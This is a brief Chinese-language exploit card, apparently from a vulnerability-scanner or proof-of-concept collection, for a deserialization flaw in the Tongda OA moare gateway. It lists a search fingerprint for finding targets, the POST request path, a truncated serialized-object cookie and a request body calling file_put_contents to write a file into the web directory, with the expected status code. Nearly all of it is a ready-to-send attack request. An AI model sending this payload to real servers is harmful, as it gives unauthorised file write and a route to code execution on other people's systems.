# 通达OAmoare反序列化漏洞

- **系统**：通达OA　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/appbuilder/web/portal/gateway/moare?a=1 HTTP/1.1`
- **关键头**：`Cookie: _COOKIE=8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO%3A23%3…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
img=file_put_contents("../../dudesuite.txt","dudesuite");
```
- **预期**：500　|　—